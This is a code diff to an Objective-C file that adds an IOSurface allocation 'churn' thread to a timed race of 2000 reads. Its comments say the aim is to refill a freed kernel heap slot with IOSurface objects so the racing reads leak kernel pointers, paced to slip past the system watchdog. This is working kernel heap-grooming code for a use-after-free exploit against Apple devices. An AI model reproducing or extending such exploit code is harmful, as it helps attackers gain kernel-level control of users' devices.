@@ -19,6 +19,10 @@
 //
 
 #import "P122SwordForge.h"
+#import <dlfcn.h>
+#import <pthread.h>
+#import <pthread/qos.h>
+#import <IOSurface/IOSurfaceRef.h>
 #import <Foundation/Foundation.h>
 #import <Metal/Metal.h>
 #import <dlfcn.h>
@@ -67,6 +71,42 @@ static NSString *P122Ret(void) {
     NSString *p = [docs stringByAppendingPathComponent:@"p122_swordforge_log.txt"];
     NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
     return t ?: @"p122: empty";
+}
+
+/* 2026-11-19 IOSurface churn (the 17:23 receipt: 2000 raced reads found
+   ZERO kernel-shaped occupants — the freed MD slot had NOTHING kernel-side
+   competing for it during the entire read phase). The p159 anchors are
+   IOSurface-adjacency kernel heap VAs — churning the same family means
+   IOSurface kernel objects compete for the freed MD slot. UTILITY QoS +
+   25ms pacing = no watchdog class. */
+static volatile int g_p122SurfGo = 0;
+typedef IOSurfaceRef (*p122_surfcreate_t)(CFDictionaryRef);
+static void *p122_surf_churn(void *arg) {
+    (void)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
+    p122_surfcreate_t pCr = (p122_surfcreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    if (!pCr) return NULL;
+    int32_t w = 64, h = 64, bpe = 4;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    const void *ck[3] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement") };
+    const void *cv[3] = { nw, nh, nb };
+    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, ck, cv, 3,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFRelease(nw); CFRelease(nh); CFRelease(nb);
+    uint64_t cycles = 0;
+    while (g_p122SurfGo) {
+        for (int i = 0; i < 8 && g_p122SurfGo; i++) {
+            IOSurfaceRef s = pCr(props);
+            if (s) CFRelease(s);
+            cycles++;
+        }
+        usleep(25000);
+    }
+    if (props) CFRelease(props);
+    p122_log(@"[churn] IOSurface churn stopped (cycles=%llu)", (unsigned long long)cycles);
+    return NULL;
 }
 
 @implementation P122SwordForge
@@ -155,6 +195,14 @@ static NSString *P122Ret(void) {
        30k/sec x 60s wedged the GPU-driver path — capped at 2000 calls,
        1000us spacing, single thread). Every out classified by kernel-shape. */
     if (conn && rid) {
+        /* 2026-11-19: IOSurface churn LIVE during the raced reads — the
+           no-churn receipt measured the zone's natural population only */
+        pthread_t thChurn = 0;
+        g_p122SurfGo = 1;
+        if (pthread_create(&thChurn, NULL, p122_surf_churn, NULL) == 0)
+            p122_log(@"[churn] IOSurface churn LIVE during the read phase (p159-family, 25 ms pacing)");
+        else { g_p122SurfGo = 0; thChurn = 0; }
+
         uint64_t hits = 0, survivors = 0, kshapeHits = 0;
         uint64_t lastShapedOuts[8] = {0}; uint32_t shapedN = 0;
         for (int t = 0; t < 2000; t++) {
@@ -176,7 +224,9 @@ static NSString *P122Ret(void) {
             usleep(1000);   /* wedge law: 2000 x 1000us = 2s max, single thread */
             if (t == 500 || t == 1500) p122_log(@"[reader] raced: t=%d hits=%llu survivors=%llu kshape=%llu", t, hits, survivors, kshapeHits);
         }
-        p122_log(@"[reader] RACE FINISH: hits=%llu survivors(non-kshape)=%llu kshapeHits=%llu", hits, survivors, kshapeHits);
+        g_p122SurfGo = 0;
+        if (thChurn) pthread_join(thChurn, NULL);
+        p122_log(@"[reader] RACE FINISH (with IOSurface churn): hits=%llu survivors(non-kshape)=%llu kshapeHits=%llu", hits, survivors, kshapeHits);
         for (uint32_t i = 0; i < shapedN && i < 4; i++)
             p122_log(@"  [++] kshape out[%u]=0x%llx", i, lastShapedOuts[i]);
         if (kshapeHits > 0) {
